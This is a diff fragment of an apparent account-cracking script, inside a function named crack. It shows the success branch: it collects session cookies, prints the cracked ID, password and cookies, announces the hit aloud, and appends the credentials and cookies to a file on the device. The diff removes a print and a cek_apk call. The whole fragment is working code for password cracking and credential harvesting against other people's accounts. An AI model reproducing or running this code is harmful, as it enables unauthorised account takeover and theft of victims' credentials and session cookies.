@@ -903,9 +903,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;90m[OK 😍] {idf} • {pw}\n\033[0;36m[🌺]= COOKIES • \033[0;92m{kuki} ')
-                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  A,  OK,  id"')
-                print(f'{B}[NUMBER📳] {K}'+uid+'  ')
-                cek_apk(session,coki)                
+                os.system('espeak -a 300 "ALHAMDULLIAH,  YOU,  GOT,  A,  OK,  id"')              
                 open('/sdcard/M1•Sheikh-OK.txt', 'a').write( uid+' | '+ps+' | '+kuki+'\n')
                 break
                 
